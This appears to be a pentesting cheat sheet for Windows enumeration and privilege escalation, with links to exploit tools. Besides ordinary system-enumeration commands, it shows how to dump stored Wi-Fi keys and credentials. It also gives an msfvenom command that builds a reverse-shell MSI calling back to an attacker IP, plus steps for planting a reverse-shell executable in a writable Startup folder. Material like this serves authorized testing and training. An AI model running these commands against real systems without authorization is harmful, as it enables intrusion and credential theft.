# Windows-Enumeration
### Print Current User

```
whoami
```

### Print Current User Privlages
```
whoami  /priv
```

### Print Current User Groups
```
whoami  /groups
```

### List Users
```
net user 
```

### List User Info 
```
net user %username%
```

### List Groups
```
net localgroup
```

### List Group Info 
```
net localgroup %groupname%
```

### System Info
```
hostname
```
```
systeminfo
```
```
wmic csproduct get name
```
```
wmic bios get serialnumber
```
```
wmic computersystem list brief
```

### List Recent Patches
```
wmic qfe
```
```
powershell.exe -c Get-Hotfix
```
  > ***windows management instumentation command quick fix engineering***

### List Drives
```
wmic logicaldisk 
```
```
wmic logicaldisk get volumename,name
```
```
powershell.exe -c "Get-PsDrive -PsProvider FileSystem"
```
```
wmic volume list brief
```

### list interfaces
```
ipconfig /all
```

### List arp table
```
arp -a
```

### Print routing table 
```
route print
```

### Print listening ports

```
netstat -ano
netstat -nr
netstat -naob
```

### Windows Defender Status
```
sc query windefend
```

### Services and Process Enumeration
```
takslist
```
```
tasklist /svc
```
```
wmic service list brief | findstr "Running"
```
```
wmic service list brief | findstr "Stopped"
```
```
wmic service list config
```
```
sc query %servicename%
```

### Firewall status and configuration
```
netsh firewall show state
```
```
netsh firewall show config
```

### Check Stored Credentials
```
cmdkey /list
```
### Get Stored WiFi Profile and Credentials
```
netsh wlan show profile
```
```
netsh wlan show profile %profilename% key=clear
```
## AlwaysInstallElevated – Windows Privilege Escalation

AlwaysInstallElevated policy feature is used to install an MSI package file with elevated system privileges. This policy is enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs any program (msi) on the system. This method can make a machine vulnerable posing a high-security risk because a non-administrator user can run installations with elevated privileges and access many secure locations on the computer.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- if AlwaysInstallElevated value is set to 0x1, it means it is enabled on the host!
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
```
- Transfer malicious msi and Run it on Target to Get a Shell Back!

Reference: https://juggernaut-sec.com/alwaysinstallelevated/

## Autorun Startup Registry Keys – Windows Privilege Escalation
https://juggernaut-sec.com/autorun-startup-registry-keys/

## Registry Services ACL
https://swepstopia.com/registry-services-acl/

## Windows Privilege Escalation – Startup Applications

When a user logs on to the system, there are two folders where programs automatically start (execute) from called the Startup folders. The Startup folders can be found in the following locations:
1. C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
1. C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

The first folder is tied to the specific user logging on and only executes for that user. The second folder however is the machine startup folder, which means that any startup applications in that folder will be execute when ANY user logs on to the system.

We can enumerate the Startup folder permissions using built-in commands as well as tools.

```
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
```
Accesschk.exe -accepteula -wuqv "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
- If everyone on the system has access to write to the path system startup folder, means it can be exploited.
- Place a malicious executable that will execute a reverse shell in the startup directory.
- Next time an administrator user logs in you will get a reverse shell.

Reference: https://steflan-security.com/windows-privilege-escalation-startup-applications/

## Windows Privilege Escalation: Weak Service Permissions
https://systemweakness.com/windows-privilege-escalation-weak-service-permissions-54b19d339024

## DLL Hijacking – Windows Privilege Escalation
https://juggernaut-sec.com/dll-hijacking/

## Token Impersonation
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/token-impersonation

# Windows-Post-Exploitaiton-Scripts

### Windows kernal Exploits
https://github.com/SecWiki/windows-kernel-exploits

### Windows Exploit Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Privesc guide
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

### Automated Tools
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

https://github.com/411Hall/JAWS

https://github.com/GhostPack/Seatbelt

https://github.com/GhostPack/SharpUp

https://github.com/rasta-mouse/Watson

https://github.com/rasta-mouse/Sherlock

### CheatSheet
https://github.com/Sp4c3Tr4v3l3r/OSCP

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


### Restricted Shell Escape
https://vk9-sec.com/linux-restricted-shell-bypass/


# Windows Powershell Reverse Shells
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/

https://www.revshells.com/

https://trojand.com/cheatsheet/Network/Connections/SSH_Tunneling.html
